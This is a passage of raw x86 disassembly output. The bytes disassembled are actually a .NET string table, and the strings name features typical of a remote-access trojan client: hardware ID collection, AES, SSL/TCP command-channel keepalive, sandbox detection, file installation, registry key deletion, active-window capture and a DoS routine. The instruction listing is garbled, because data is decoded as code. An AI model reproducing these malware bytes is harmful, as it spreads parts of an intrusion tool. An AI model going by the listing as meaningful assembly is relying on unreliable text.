  40598c:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  405990:	36 39 38             	cmp    %edi,%ss:(%eax)
  405993:	44                   	inc    %esp
  405994:	38 46 35             	cmp    %al,0x35(%esi)
  405997:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  40599b:	41                   	inc    %ecx
  40599c:	37                   	aaa
  40599d:	32 31                	xor    (%ecx),%dh
  40599f:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4059a5:	43                   	inc    %ebx
  4059a6:	35 38 42 00 47       	xor    $0x47004238,%eax
  4059ab:	43                   	inc    %ebx
  4059ac:	00 45 53             	add    %al,0x53(%ebp)
  4059af:	5f                   	pop    %edi
  4059b0:	53                   	push   %ebx
  4059b1:	59                   	pop    %ecx
  4059b2:	53                   	push   %ebx
  4059b3:	54                   	push   %esp
  4059b4:	45                   	inc    %ebp
  4059b5:	4d                   	dec    %ebp
  4059b6:	5f                   	pop    %edi
  4059b7:	52                   	push   %edx
  4059b8:	45                   	inc    %ebp
  4059b9:	51                   	push   %ecx
  4059ba:	55                   	push   %ebp
  4059bb:	49                   	dec    %ecx
  4059bc:	52                   	push   %edx
  4059bd:	45                   	inc    %ebp
  4059be:	44                   	inc    %esp
  4059bf:	00 45 53             	add    %al,0x53(%ebp)
  4059c2:	5f                   	pop    %edi
  4059c3:	44                   	inc    %esp
  4059c4:	49                   	dec    %ecx
  4059c5:	53                   	push   %ebx
  4059c6:	50                   	push   %eax
  4059c7:	4c                   	dec    %esp
  4059c8:	41                   	inc    %ecx
  4059c9:	59                   	pop    %ecx
  4059ca:	5f                   	pop    %edi
  4059cb:	52                   	push   %edx
  4059cc:	45                   	inc    %ebp
  4059cd:	51                   	push   %ecx
  4059ce:	55                   	push   %ebp
  4059cf:	49                   	dec    %ecx
  4059d0:	52                   	push   %edx
  4059d1:	45                   	inc    %ebp
  4059d2:	44                   	inc    %esp
  4059d3:	00 4d 61             	add    %cl,0x61(%ebp)
  4059d6:	70 4e                	jo     0x405a26
  4059d8:	61                   	popa
  4059d9:	6d                   	insl   (%dx),%es:(%edi)
  4059da:	65 54                	gs push %esp
  4059dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059dd:	4f                   	dec    %edi
  4059de:	49                   	dec    %ecx
  4059df:	44                   	inc    %esp
  4059e0:	00 48 57             	add    %cl,0x57(%eax)
  4059e3:	49                   	dec    %ecx
  4059e4:	44                   	inc    %esp
  4059e5:	00 67 65             	add    %ah,0x65(%edi)
  4059e8:	74 5f                	je     0x405a49
  4059ea:	46                   	inc    %esi
  4059eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4059ec:	72 6d                	jb     0x405a5b
  4059ee:	61                   	popa
  4059ef:	74 49                	je     0x405a3a
  4059f1:	44                   	inc    %esp
  4059f2:	00 45 58             	add    %al,0x58(%ebp)
  4059f5:	45                   	inc    %ebp
  4059f6:	43                   	inc    %ebx
  4059f7:	55                   	push   %ebp
  4059f8:	54                   	push   %esp
  4059f9:	49                   	dec    %ecx
  4059fa:	4f                   	dec    %edi
  4059fb:	4e                   	dec    %esi
  4059fc:	5f                   	pop    %edi
  4059fd:	53                   	push   %ebx
  4059fe:	54                   	push   %esp
  4059ff:	41                   	inc    %ecx
  405a00:	54                   	push   %esp
  405a01:	45                   	inc    %ebp
  405a02:	00 67 65             	add    %ah,0x65(%edi)
  405a05:	74 5f                	je     0x405a66
  405a07:	41                   	inc    %ecx
  405a08:	53                   	push   %ebx
  405a09:	43                   	inc    %ebx
  405a0a:	49                   	dec    %ecx
  405a0b:	49                   	dec    %ecx
  405a0c:	00 53 79             	add    %dl,0x79(%ebx)
  405a0f:	73 74                	jae    0x405a85
  405a11:	65 6d                	gs insl (%dx),%es:(%edi)
  405a13:	2e 49                	cs dec %ecx
  405a15:	4f                   	dec    %edi
  405a16:	00 41 55             	add    %al,0x55(%ecx)
  405a19:	38 38                	cmp    %bh,(%eax)
  405a1b:	41                   	inc    %ecx
  405a1c:	50                   	push   %eax
  405a1d:	50                   	push   %eax
  405a1e:	00 49 73             	add    %cl,0x73(%ecx)
  405a21:	58                   	pop    %eax
  405a22:	50                   	push   %eax
  405a23:	00 42 44             	add    %al,0x44(%edx)
  405a26:	4f                   	dec    %edi
  405a27:	53                   	push   %ebx
  405a28:	00 45 53             	add    %al,0x53(%ebp)
  405a2b:	5f                   	pop    %edi
  405a2c:	43                   	inc    %ebx
  405a2d:	4f                   	dec    %edi
  405a2e:	4e                   	dec    %esi
  405a2f:	54                   	push   %esp
  405a30:	49                   	dec    %ecx
  405a31:	4e                   	dec    %esi
  405a32:	55                   	push   %ebp
  405a33:	4f                   	dec    %edi
  405a34:	55                   	push   %ebp
  405a35:	53                   	push   %ebx
  405a36:	00 67 65             	add    %ah,0x65(%edi)
  405a39:	74 5f                	je     0x405a9a
  405a3b:	49                   	dec    %ecx
  405a3c:	56                   	push   %esi
  405a3d:	00 73 65             	add    %dh,0x65(%ebx)
  405a40:	74 5f                	je     0x405aa1
  405a42:	49                   	dec    %ecx
  405a43:	56                   	push   %esi
  405a44:	00 47 65             	add    %al,0x65(%edi)
  405a47:	6e                   	outsb  %ds:(%esi),(%dx)
  405a48:	65 72 61             	gs jb  0x405aac
  405a4b:	74 65                	je     0x405ab2
  405a4d:	49                   	dec    %ecx
  405a4e:	56                   	push   %esi
  405a4f:	00 4d 54             	add    %cl,0x54(%ebp)
  405a52:	58                   	pop    %eax
  405a53:	00 76 61             	add    %dh,0x61(%esi)
  405a56:	6c                   	insb   (%dx),%es:(%edi)
  405a57:	75 65                	jne    0x405abe
  405a59:	5f                   	pop    %edi
  405a5a:	5f                   	pop    %edi
  405a5b:	00 52 65             	add    %dl,0x65(%edx)
  405a5e:	61                   	popa
  405a5f:	64 53                	fs push %ebx
  405a61:	65 72 76             	gs jb  0x405ada
  405a64:	65 72 74             	gs jb  0x405adb
  405a67:	44                   	inc    %esp
  405a68:	61                   	popa
  405a69:	74 61                	je     0x405acc
  405a6b:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  405a6f:	61                   	popa
  405a70:	00 4d 65             	add    %cl,0x65(%ebp)
  405a73:	73 73                	jae    0x405ae8
  405a75:	61                   	popa
  405a76:	67 65 50             	addr16 gs push %eax
  405a79:	61                   	popa
  405a7a:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  405a7d:	69 62 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%edx),%esp
  405a84:	72 6c                	jb     0x405af2
  405a86:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  405a8d:	65 6d                	gs insl (%dx),%es:(%edi)
  405a8f:	2e 43                	cs inc %ebx
  405a91:	6f                   	outsl  %ds:(%esi),(%dx)
  405a92:	6c                   	insb   (%dx),%es:(%edi)
  405a93:	6c                   	insb   (%dx),%es:(%edi)
  405a94:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405a99:	6e                   	outsb  %ds:(%esi),(%dx)
  405a9a:	73 2e                	jae    0x405aca
  405a9c:	47                   	inc    %edi
  405a9d:	65 6e                	outsb  %gs:(%esi),(%dx)
  405a9f:	65 72 69             	gs jb  0x405b0b
  405aa2:	63 00                	arpl   %eax,(%eax)
  405aa4:	4d                   	dec    %ebp
  405aa5:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  405aac:	74 2e                	je     0x405adc
  405aae:	56                   	push   %esi
  405aaf:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  405ab6:	73 69                	jae    0x405b21
  405ab8:	63 00                	arpl   %eax,(%eax)
  405aba:	67 65 74 5f          	addr16 gs je 0x405b1d
  405abe:	53                   	push   %ebx
  405abf:	65 6e                	outsb  %gs:(%esi),(%dx)
  405ac1:	64 53                	fs push %ebx
  405ac3:	79 6e                	jns    0x405b33
  405ac5:	63 00                	arpl   %eax,(%eax)
  405ac7:	45                   	inc    %ebp
  405ac8:	6e                   	outsb  %ds:(%esi),(%dx)
  405ac9:	64 52                	fs push %edx
  405acb:	65 61                	gs popa
  405acd:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  405ad1:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  405ad8:	00 
  405ad9:	54                   	push   %esp
  405ada:	68 72 65 61 64       	push   $0x64616572
  405adf:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  405ae3:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  405ae7:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  405aeb:	41                   	inc    %ecx
  405aec:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  405af2:	61                   	popa
  405af3:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  405af9:	74 5f                	je     0x405b5a
  405afb:	43                   	inc    %ebx
  405afc:	6f                   	outsl  %ds:(%esi),(%dx)
  405afd:	6e                   	outsb  %ds:(%esi),(%dx)
  405afe:	6e                   	outsb  %ds:(%esi),(%dx)
  405aff:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405b04:	00 67 65             	add    %ah,0x65(%edi)
  405b07:	74 5f                	je     0x405b68
  405b09:	49                   	dec    %ecx
  405b0a:	73 43                	jae    0x405b4f
  405b0c:	6f                   	outsl  %ds:(%esi),(%dx)
  405b0d:	6e                   	outsb  %ds:(%esi),(%dx)
  405b0e:	6e                   	outsb  %ds:(%esi),(%dx)
  405b0f:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405b14:	00 73 65             	add    %dh,0x65(%ebx)
  405b17:	74 5f                	je     0x405b78
  405b19:	49                   	dec    %ecx
  405b1a:	73 43                	jae    0x405b5f
  405b1c:	6f                   	outsl  %ds:(%esi),(%dx)
  405b1d:	6e                   	outsb  %ds:(%esi),(%dx)
  405b1e:	6e                   	outsb  %ds:(%esi),(%dx)
  405b1f:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405b24:	00 52 65             	add    %dl,0x65(%edx)
  405b27:	63 65 69             	arpl   %esp,0x69(%ebp)
  405b2a:	76 65                	jbe    0x405b91
  405b2c:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  405b30:	74 5f                	je     0x405b91
  405b32:	47                   	inc    %edi
  405b33:	75 69                	jne    0x405b9e
  405b35:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  405b39:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  405b40:	64 
  405b41:	53                   	push   %ebx
  405b42:	79 6e                	jns    0x405bb2
  405b44:	63 3e                	arpl   %edi,(%esi)
  405b46:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  405b4a:	61                   	popa
  405b4b:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405b4e:	6e                   	outsb  %ds:(%esi),(%dx)
  405b4f:	67 46                	addr16 inc %esi
  405b51:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  405b58:	73 43                	jae    0x405b9d
  405b5a:	6f                   	outsl  %ds:(%esi),(%dx)
  405b5b:	6e                   	outsb  %ds:(%esi),(%dx)
  405b5c:	6e                   	outsb  %ds:(%esi),(%dx)
  405b5d:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405b62:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  405b67:	61                   	popa
  405b68:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405b6b:	6e                   	outsb  %ds:(%esi),(%dx)
  405b6c:	67 46                	addr16 inc %esi
  405b6e:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  405b75:	65 65 70 41          	gs gs jo 0x405bba
  405b79:	6c                   	insb   (%dx),%es:(%edi)
  405b7a:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  405b81:	42                   	inc    %edx
  405b82:	61                   	popa
  405b83:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405b86:	6e                   	outsb  %ds:(%esi),(%dx)
  405b87:	67 46                	addr16 inc %esi
  405b89:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  405b90:	65 61                	gs popa
  405b92:	64 65 72 53          	fs gs jb 0x405be9
  405b96:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  405b9d:	42                   	inc    %edx
  405b9e:	61                   	popa
  405b9f:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405ba2:	6e                   	outsb  %ds:(%esi),(%dx)
  405ba3:	67 46                	addr16 inc %esi
  405ba5:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  405bac:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  405bb3:	42                   	inc    %edx
  405bb4:	61                   	popa
  405bb5:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405bb8:	6e                   	outsb  %ds:(%esi),(%dx)
  405bb9:	67 46                	addr16 inc %esi
  405bbb:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  405bc2:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  405bc6:	61                   	popa
  405bc7:	74 65                	je     0x405c2e
  405bc9:	50                   	push   %eax
  405bca:	6f                   	outsl  %ds:(%esi),(%dx)
  405bcb:	6e                   	outsb  %ds:(%esi),(%dx)
  405bcc:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  405bd2:	61                   	popa
  405bd3:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405bd6:	6e                   	outsb  %ds:(%esi),(%dx)
  405bd7:	67 46                	addr16 inc %esi
  405bd9:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  405be0:	6e                   	outsb  %ds:(%esi),(%dx)
  405be1:	74 65                	je     0x405c48
  405be3:	72 76                	jb     0x405c5b
  405be5:	61                   	popa
  405be6:	6c                   	insb   (%dx),%es:(%edi)
  405be7:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  405bec:	61                   	popa
  405bed:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405bf0:	6e                   	outsb  %ds:(%esi),(%dx)
  405bf1:	67 46                	addr16 inc %esi
  405bf3:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  405bfa:	75 66                	jne    0x405c62
  405bfc:	66 65 72 3e          	data16 gs jb 0x405c3e
  405c00:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  405c04:	61                   	popa
  405c05:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c08:	6e                   	outsb  %ds:(%esi),(%dx)
  405c09:	67 46                	addr16 inc %esi
  405c0b:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  405c12:	66 66 73 65          	data16 data16 jae 0x405c7b
  405c16:	74 3e                	je     0x405c56
  405c18:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  405c1c:	61                   	popa
  405c1d:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c20:	6e                   	outsb  %ds:(%esi),(%dx)
  405c21:	67 46                	addr16 inc %esi
  405c23:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  405c2a:	73 6c                	jae    0x405c98
  405c2c:	43                   	inc    %ebx
  405c2d:	6c                   	insb   (%dx),%es:(%edi)
  405c2e:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  405c35:	5f                   	pop    %edi
  405c36:	42                   	inc    %edx
  405c37:	61                   	popa
  405c38:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c3b:	6e                   	outsb  %ds:(%esi),(%dx)
  405c3c:	67 46                	addr16 inc %esi
  405c3e:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  405c45:	63 70 43             	arpl   %esi,0x43(%eax)
  405c48:	6c                   	insb   (%dx),%es:(%edi)
  405c49:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  405c50:	5f                   	pop    %edi
  405c51:	42                   	inc    %edx
  405c52:	61                   	popa
  405c53:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c56:	6e                   	outsb  %ds:(%esi),(%dx)
  405c57:	67 46                	addr16 inc %esi
  405c59:	69 65 6c 64 00 68 57 	imul   $0x57680064,0x6c(%ebp),%esp
  405c60:	6e                   	outsb  %ds:(%esi),(%dx)
  405c61:	64 00 53 65          	add    %dl,%fs:0x65(%ebx)
  405c65:	6e                   	outsb  %ds:(%esi),(%dx)
  405c66:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  405c6a:	70 65                	jo     0x405cd1
  405c6c:	6e                   	outsb  %ds:(%esi),(%dx)
  405c6d:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  405c71:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  405c78:	61 
  405c79:	6c                   	insb   (%dx),%es:(%edi)
  405c7a:	75 65                	jne    0x405ce1
  405c7c:	4b                   	dec    %ebx
  405c7d:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  405c84:	6c                   	insb   (%dx),%es:(%edi)
  405c85:	61                   	popa
  405c86:	63 65 00             	arpl   %esp,0x0(%ebp)
  405c89:	43                   	inc    %ebx
  405c8a:	72 65                	jb     0x405cf1
  405c8c:	61                   	popa
  405c8d:	74 65                	je     0x405cf4
  405c8f:	49                   	dec    %ecx
  405c90:	6e                   	outsb  %ds:(%esi),(%dx)
  405c91:	73 74                	jae    0x405d07
  405c93:	61                   	popa
  405c94:	6e                   	outsb  %ds:(%esi),(%dx)
  405c95:	63 65 00             	arpl   %esp,0x0(%ebp)
  405c98:	73 65                	jae    0x405cff
  405c9a:	74 5f                	je     0x405cfb
  405c9c:	4d                   	dec    %ebp
  405c9d:	6f                   	outsl  %ds:(%esi),(%dx)
  405c9e:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  405ca3:	6c                   	insb   (%dx),%es:(%edi)
  405ca4:	65 4d                	gs dec %ebp
  405ca6:	6f                   	outsl  %ds:(%esi),(%dx)
  405ca7:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  405cac:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  405cb3:	64 65 
  405cb5:	00 45 6e             	add    %al,0x6e(%ebp)
  405cb8:	74 65                	je     0x405d1f
  405cba:	72 44                	jb     0x405d00
  405cbc:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  405cc0:	4d                   	dec    %ebp
  405cc1:	6f                   	outsl  %ds:(%esi),(%dx)
  405cc2:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  405cc7:	79 70                	jns    0x405d39
  405cc9:	74 6f                	je     0x405d3a
  405ccb:	53                   	push   %ebx
  405ccc:	74 72                	je     0x405d40
  405cce:	65 61                	gs popa
  405cd0:	6d                   	insl   (%dx),%es:(%edi)
  405cd1:	4d                   	dec    %ebp
  405cd2:	6f                   	outsl  %ds:(%esi),(%dx)
  405cd3:	64 65 00 43 69       	fs add %al,%gs:0x69(%ebx)
  405cd8:	70 68                	jo     0x405d42
  405cda:	65 72 4d             	gs jb  0x405d2a
  405cdd:	6f                   	outsl  %ds:(%esi),(%dx)
  405cde:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  405ce3:	6c                   	insb   (%dx),%es:(%edi)
  405ce4:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  405ce9:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  405cef:	65 74 65             	gs je  0x405d57
  405cf2:	53                   	push   %ebx
  405cf3:	75 62                	jne    0x405d57
  405cf5:	4b                   	dec    %ebx
  405cf6:	65 79 54             	gs jns 0x405d4d
  405cf9:	72 65                	jb     0x405d60
  405cfb:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405cff:	74 5f                	je     0x405d60
  405d01:	4d                   	dec    %ebp
  405d02:	65 73 73             	gs jae 0x405d78
  405d05:	61                   	popa
  405d06:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  405d0b:	74 65                	je     0x405d72
  405d0d:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  405d11:	6e                   	outsb  %ds:(%esi),(%dx)
  405d12:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  405d16:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  405d1d:	6b 65 00 45          	imul   $0x45,0x0(%ebp),%esp
  405d21:	6e                   	outsb  %ds:(%esi),(%dx)
  405d22:	75 6d                	jne    0x405d91
  405d24:	65 72 61             	gs jb  0x405d88
  405d27:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  405d2b:	49                   	dec    %ecx
  405d2c:	44                   	inc    %esp
  405d2d:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  405d34:	6c                   	insb   (%dx),%es:(%edi)
  405d35:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405d39:	74 5f                	je     0x405d9a
  405d3b:	48                   	dec    %eax
  405d3c:	61                   	popa
  405d3d:	6e                   	outsb  %ds:(%esi),(%dx)
  405d3e:	64 6c                	fs insb (%dx),%es:(%edi)
  405d40:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  405d44:	6e                   	outsb  %ds:(%esi),(%dx)
  405d45:	74 69                	je     0x405db0
  405d47:	6d                   	insl   (%dx),%es:(%edi)
  405d48:	65 46                	gs inc %esi
  405d4a:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  405d51:	64 6c                	fs insb (%dx),%es:(%edi)
  405d53:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405d57:	74 4d                	je     0x405da6
  405d59:	6f                   	outsl  %ds:(%esi),(%dx)
  405d5a:	64 75 6c             	fs jne 0x405dc9
  405d5d:	65 48                	gs dec %eax
  405d5f:	61                   	popa
  405d60:	6e                   	outsb  %ds:(%esi),(%dx)
  405d61:	64 6c                	fs insb (%dx),%es:(%edi)
  405d63:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  405d67:	6e                   	outsb  %ds:(%esi),(%dx)
  405d68:	74 69                	je     0x405dd3
  405d6a:	6d                   	insl   (%dx),%es:(%edi)
  405d6b:	65 54                	gs push %esp
  405d6d:	79 70                	jns    0x405ddf
  405d6f:	65 48                	gs dec %eax
  405d71:	61                   	popa
  405d72:	6e                   	outsb  %ds:(%esi),(%dx)
  405d73:	64 6c                	fs insb (%dx),%es:(%edi)
  405d75:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405d79:	74 54                	je     0x405dcf
  405d7b:	79 70                	jns    0x405ded
  405d7d:	65 46                	gs inc %esi
  405d7f:	72 6f                	jb     0x405df0
  405d81:	6d                   	insl   (%dx),%es:(%edi)
  405d82:	48                   	dec    %eax
  405d83:	61                   	popa
  405d84:	6e                   	outsb  %ds:(%esi),(%dx)
  405d85:	64 6c                	fs insb (%dx),%es:(%edi)
  405d87:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  405d8b:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  405d92:	65 
  405d93:	00 49 6e             	add    %cl,0x6e(%ecx)
  405d96:	73 74                	jae    0x405e0c
  405d98:	61                   	popa
  405d99:	6c                   	insb   (%dx),%es:(%edi)
  405d9a:	6c                   	insb   (%dx),%es:(%edi)
  405d9b:	46                   	inc    %esi
  405d9c:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  405da3:	6e 
  405da4:	52                   	push   %edx
  405da5:	6f                   	outsl  %ds:(%esi),(%dx)
  405da6:	6c                   	insb   (%dx),%es:(%edi)
  405da7:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  405dab:	6e                   	outsb  %ds:(%esi),(%dx)
  405dac:	64 6f                	outsl  %fs:(%esi),(%dx)
  405dae:	77 73                	ja     0x405e23
  405db0:	42                   	inc    %edx
  405db1:	75 69                	jne    0x405e1c
  405db3:	6c                   	insb   (%dx),%es:(%edi)
  405db4:	74 49                	je     0x405dff
  405db6:	6e                   	outsb  %ds:(%esi),(%dx)
  405db7:	52                   	push   %edx
  405db8:	6f                   	outsl  %ds:(%esi),(%dx)
  405db9:	6c                   	insb   (%dx),%es:(%edi)
  405dba:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405dbe:	74 41                	je     0x405e01
  405dc0:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  405dc4:	65 57                	gs push %edi
  405dc6:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  405dcd:	74 6c                	je     0x405e3b
  405dcf:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405dd3:	74 5f                	je     0x405e34
  405dd5:	4d                   	dec    %ebp
  405dd6:	61                   	popa
  405dd7:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  405dde:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  405de2:	6f                   	outsl  %ds:(%esi),(%dx)
  405de3:	63 65 73             	arpl   %esp,0x73(%ebp)
  405de6:	73 4d                	jae    0x405e35
  405de8:	6f                   	outsl  %ds:(%esi),(%dx)
  405de9:	64 75 6c             	fs jne 0x405e58
  405dec:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  405df0:	74 5f                	je     0x405e51
  405df2:	57                   	push   %edi
  405df3:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  405dfa:	79 6c                	jns    0x405e68
  405dfc:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  405e00:	6f                   	outsl  %ds:(%esi),(%dx)
  405e01:	63 65 73             	arpl   %esp,0x73(%ebp)
  405e04:	73 57                	jae    0x405e5d
  405e06:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  405e0d:	79 6c                	jns    0x405e7b
  405e0f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e13:	74 5f                	je     0x405e74
  405e15:	4e                   	dec    %esi
  405e16:	61                   	popa
  405e17:	6d                   	insl   (%dx),%es:(%edi)
  405e18:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e1c:	74 5f                	je     0x405e7d
  405e1e:	46                   	inc    %esi
  405e1f:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405e26:	00 
  405e27:	73 65                	jae    0x405e8e
  405e29:	74 5f                	je     0x405e8a
  405e2b:	46                   	inc    %esi
  405e2c:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405e33:	00 
  405e34:	47                   	inc    %edi
  405e35:	65 74 54             	gs je  0x405e8c
  405e38:	65 6d                	gs insl (%dx),%es:(%edi)
  405e3a:	70 46                	jo     0x405e82
  405e3c:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405e43:	00 
  405e44:	47                   	inc    %edi
  405e45:	65 74 46             	gs je  0x405e8e
  405e48:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405e4f:	00 
  405e50:	6c                   	insb   (%dx),%es:(%edi)
  405e51:	70 4d                	jo     0x405ea0
  405e53:	6f                   	outsl  %ds:(%esi),(%dx)
  405e54:	64 75 6c             	fs jne 0x405ec3
  405e57:	65 4e                	gs dec %esi
  405e59:	61                   	popa
  405e5a:	6d                   	insl   (%dx),%es:(%edi)
  405e5b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e5f:	74 5f                	je     0x405ec0
  405e61:	4d                   	dec    %ebp
  405e62:	61                   	popa
  405e63:	63 68 69             	arpl   %ebp,0x69(%eax)
  405e66:	6e                   	outsb  %ds:(%esi),(%dx)
  405e67:	65 4e                	gs dec %esi
  405e69:	61                   	popa
  405e6a:	6d                   	insl   (%dx),%es:(%edi)
  405e6b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e6f:	74 5f                	je     0x405ed0
  405e71:	4f                   	dec    %edi
  405e72:	53                   	push   %ebx
  405e73:	46                   	inc    %esi
  405e74:	75 6c                	jne    0x405ee2
  405e76:	6c                   	insb   (%dx),%es:(%edi)
  405e77:	4e                   	dec    %esi
  405e78:	61                   	popa
  405e79:	6d                   	insl   (%dx),%es:(%edi)
  405e7a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e7e:	74 5f                	je     0x405edf
  405e80:	46                   	inc    %esi
  405e81:	75 6c                	jne    0x405eef
  405e83:	6c                   	insb   (%dx),%es:(%edi)
  405e84:	4e                   	dec    %esi
  405e85:	61                   	popa
  405e86:	6d                   	insl   (%dx),%es:(%edi)
  405e87:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  405e8b:	56                   	push   %esi
  405e8c:	61                   	popa
  405e8d:	6c                   	insb   (%dx),%es:(%edi)
  405e8e:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  405e95:	6e 
  405e96:	4e                   	dec    %esi
  405e97:	61                   	popa
